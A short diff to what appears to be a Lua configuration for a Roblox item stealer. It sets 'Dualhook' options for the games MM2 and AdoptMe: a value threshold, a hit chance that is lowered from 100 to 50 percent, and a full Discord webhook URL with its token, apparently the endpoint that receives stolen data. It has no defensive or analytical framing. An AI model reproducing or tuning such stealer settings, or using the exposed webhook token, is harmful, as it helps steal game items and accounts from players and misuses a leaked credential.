@@ -4,7 +4,7 @@ Config = {
     DualhookSettings = {
         MM2 = {
             Value = 1500,
-            Chance = 100, -- from 0 to 100 %
+            Chance = 50, -- from 0 to 100 %
             Webhook = 'https://discord.com/api/webhooks/1393333776771321866/JSd-vIUlI0BHy6o0sw6D8MnRMSnKfx4JJjv6UMGMrM749haU-P8MQKTCIFO2lidhwKpm',
         },
         AdoptMe = {
